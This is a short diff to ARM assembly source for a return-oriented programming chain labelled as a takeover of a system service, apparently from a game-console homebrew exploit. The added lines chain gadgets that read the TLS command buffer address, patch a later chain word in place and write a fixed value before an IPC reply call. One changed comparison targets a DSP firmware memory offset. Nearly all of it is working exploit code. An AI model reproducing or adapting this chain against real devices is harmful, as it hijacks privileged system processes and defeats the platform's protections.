@@ -238,7 +238,22 @@ NIMS_0x5E_ROP_TakeOver:
 	.word ROP_STR_R0TOR1_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
 	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
-	svcReplyAndReceive_Handles .LZero, ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4)
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r0
+	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR1PC @ pc
+	.word ROP_ABSTRACT_ADDR(1f) @ r1
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR0PC @ pc
+	.word 0xFFFF0000 @ r0
+	.word ROP_POPR1PC @ pc
+	1:
+	.word ROP_GARBAGE @ r1 - fixed above
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	svcReplyAndReceive_Handles ROP_ABSTRACT_ADDR(.LZero), ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4)
 	@ expecting cmd 0x2
 	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
 	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LPS_VerifyRsaSha256Header), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
@@ -256,7 +271,7 @@ NIMS_0x5E_ROP_TakeOver:
 	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
 	.word ROP_STR_R0TOR1_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LdspFwBssAddrPageOffset), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
 	.word ROP_POPR1R2R3PC @ pc
 	.word ROP_ABSTRACT_ADDR(1f) @ r1 - to update memcpy's r0 rop
 	.word ROP_GARBAGE @ r2
